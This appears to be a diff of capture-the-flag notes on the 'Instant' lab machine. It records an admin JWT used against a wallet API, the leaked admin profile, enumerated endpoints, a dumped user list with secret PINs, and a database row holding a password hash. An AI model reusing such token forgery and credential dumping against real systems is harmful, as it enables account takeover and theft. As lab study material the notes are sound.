@@ -1,2 +1,84 @@
 link: http://mywalletv1.instant.htb/api/v1/view/profile
 token: Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
+
+HTTP/1.1 200 OK
+Date: Sat, 01 Mar 2025 07:53:33 GMT
+Server: Werkzeug/3.0.3 Python/3.12.3
+Content-Type: application/json
+Content-Length: 236
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+{
+    "Profile": {
+        "account_status": "active",
+        "email": "admin@instant.htb",
+        "invite_token": "instant_admin_inv",
+        "role": "Admin",
+        "username": "instantAdmin",
+        "wallet_balance": "10000000",
+        "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
+    },
+    "Status": 200
+}
+
+VERSION=1
+/
+00000000:udf_7f011b1316417348324483:7f01183ad6545461448559
+NEXT-ID:1
+MD5:d41d8cd98f00b204e9800998ecf8427e
+
+http://mywalletv1.instant.htb/api/v1/login
+http://mywalletv1.instant.htb/api/v1/confirm/pin
+http://mywalletv1.instant.htb/api/v1/initiate/transaction
+http://mywalletv1.instant.htb/api/v1/register
+swagger-ui.instant.htb
+
+
+Found users:
+{
+  "Status": 200,
+  "Users": [
+    {
+      "email": "admin@instant.htb",
+      "role": "Admin",
+      "secret_pin": 87348,
+      "status": "active",
+      "username": "instantAdmin",
+      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
+    },
+    {
+      "email": "shirohige@instant.htb",
+      "role": "instantian",
+      "secret_pin": 42845,
+      "status": "active",
+      "username": "shirohige",
+      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
+    },
+    {
+      "email": "admin1@instant.htb",
+      "role": "Admin",
+      "secret_pin": 123456,
+      "status": "active",
+      "username": "admin1",
+      "wallet_id": "ba6e5997-5aee-46a4-b072-80613e606645"
+    }
+  ]
+}
+
+CREATE TABLE wallet_users (
+id INTEGER NOT NULL,
+username VARCHAR,
+email VARCHAR,
+wallet_id VARCHAR,
+password VARCHAR,
+create_date VARCHAR,
+secret_pin INTEGER,
+role VARCHAR,
+status VARCHAR,
+PRIMARY KEY (id),
+UNIQUE (username),
+UNIQUE (email),
+UNIQUE (wallet_id)
+)
+1, instantAdmin, admin@instant.htb, f0eca6e5-783a-471d-9d8f-0162cbc900db, pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978, 2024-07-23 00:20:52.529887, 87348, Admin, active
